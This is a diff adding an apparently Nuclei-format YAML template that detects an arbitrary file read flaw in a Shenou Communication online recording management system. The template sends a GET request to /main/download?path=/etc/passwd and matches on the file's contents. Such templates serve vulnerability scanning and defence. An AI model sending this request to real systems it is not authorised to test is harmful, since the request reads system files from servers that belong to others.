@@ -1,0 +1,29 @@
+id: poc-yaml-shenou-communication-download-anyfile-read
+info:
+  name: Shenou Communication Online Recording Management System Arbitrary File Read
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: file-read
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/main/download?path=/etc/passwd"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "root:"
+          - "/bin"
+      - type: word
+        part: header
+        words:
+          - "filename="
+      - type: word
+        part: body
+        words:
+          - "<"
+        negative: true
